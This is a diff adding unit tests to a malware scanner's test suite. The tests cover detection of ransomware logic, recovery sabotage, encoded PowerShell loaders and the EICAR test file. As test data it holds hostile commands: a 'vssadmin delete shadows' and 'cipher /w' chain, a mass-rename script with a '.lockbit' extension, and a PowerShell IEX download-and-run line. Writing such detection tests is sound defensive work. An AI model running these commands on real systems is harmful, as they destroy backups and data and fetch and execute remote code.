@@ -8,7 +8,7 @@ from argparse import Namespace
 from pathlib import Path
 from unittest.mock import MagicMock, patch
 
-os.environ.setdefault("RAGNAR_APP_DIR", str(Path(tempfile.gettempdir()) / "ragnar-protect-tests"))
+os.environ["RAGNAR_APP_DIR"] = tempfile.mkdtemp(prefix="ragnar-protect-tests-")
 
 from ragnar_protect import cli
 from ragnar_protect.benchmark import BenchmarkRunner
@@ -55,6 +55,36 @@ class ScannerTests(unittest.TestCase):
         self.assertIn(result.status, {"suspicious", "malicious"})
         self.assertTrue(any(item.kind == "powershell_encoded_command" for item in result.findings))
 
+    def test_ransomware_correlation_detects_mass_encryption_logic_in_script(self) -> None:
+        sample = Path(self.temp_dir.name) / "encryptor.ps1"
+        sample.write_text(
+            "\n".join(
+                [
+                    "$aes = New-Object System.Security.Cryptography.AesManaged",
+                    "Get-ChildItem C:\\Users\\Test\\Documents -Recurse -File | ForEach-Object {",
+                    "  if ($_.Extension -in '.docx','.pdf','.xlsx') {",
+                    "    Rename-Item $_.FullName ($_.FullName + '.lockbit')",
+                    "  }",
+                    "}",
+                ]
+            ),
+            encoding="utf-8",
+        )
+        result = self.scanner.scan_file(sample)
+        self.assertIn(result.status, {"suspicious", "malicious"})
+        self.assertTrue(any(item.kind == "ransomware_mass_encryption_logic" for item in result.findings))
+
+    def test_ransomware_correlation_detects_recovery_sabotage_chain(self) -> None:
+        result = self.scanner.scan_artifact(
+            "process://333/cmd.exe",
+            "cmd.exe /c vssadmin delete shadows /all /quiet && cipher /w:C:",
+            extension=".cmdline",
+            metadata={"artifact_type": "process"},
+            persist=False,
+        )
+        self.assertIn(result.status, {"suspicious", "malicious"})
+        self.assertTrue(any(item.kind == "ransomware_recovery_sabotage_chain" for item in result.findings))
+
     def test_executable_folder_report_outputs_reports(self) -> None:
         exe_dir = Path(self.temp_dir.name) / "executables"
         exe_dir.mkdir()
@@ -97,16 +127,48 @@ class ScannerTests(unittest.TestCase):
         (corpus / "clean").mkdir(parents=True)
         (corpus / "malicious").mkdir(parents=True)
         (corpus / "ransomware").mkdir(parents=True)
+        (corpus / "advanced").mkdir(parents=True)
         (corpus / "clean" / "note.txt").write_text("hello world", encoding="utf-8")
         (corpus / "malicious" / "loader.ps1").write_text("powershell.exe -EncodedCommand SQBFAFgA", encoding="utf-8")
         (corpus / "ransomware" / "readme.txt").write_text("your files have been encrypted", encoding="utf-8")
+        (corpus / "advanced" / "chain.ps1").write_text(
+            "powershell.exe -EncodedCommand SQBFAFgA; IEX (New-Object Net.WebClient).DownloadString('http://example')",
+            encoding="utf-8",
+        )
 
         runner = BenchmarkRunner(self.scanner, self.db)
         report = runner.run(corpus)
 
         self.assertTrue(Path(report.report_paths["json"]).exists())
         self.assertTrue(Path(report.report_paths["markdown"]).exists())
+        self.assertEqual(report.profile, "standard")
+        self.assertEqual(report.advanced_count, 1)
         self.assertGreaterEqual(report.detection_coverage, 50.0)
+
+    def test_benchmark_runner_hard_suite_generates_corpus(self) -> None:
+        output_dir = Path(self.temp_dir.name) / "hard_corpus"
+        runner = BenchmarkRunner(self.scanner, self.db)
+
+        report = runner.run_hard_suite(output_dir)
+
+        self.assertEqual(report.profile, "hard")
+        self.assertTrue(
+            any(str(item.get("path", "")).endswith("eicar.com.txt") for item in report.results),
+        )
+        self.assertGreater(report.advanced_count, 0)
+        self.assertTrue(Path(report.report_paths["json"]).exists())
+
+    def test_eicar_string_is_detected_as_malicious(self) -> None:
+        sample = Path(self.temp_dir.name) / "eicar.com.txt"
+        sample.write_text(
+            "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
+            encoding="ascii",
+        )
+
+        result = self.scanner.scan_file(sample)
+
+        self.assertEqual(result.status, "malicious")
+        self.assertTrue(any(item.kind == "eicar_test_file" for item in result.findings))
 
     def test_managed_path_recognizes_project_root(self) -> None:
         self.assertTrue(is_managed_path(PACKAGE_ROOT / "main.py"))
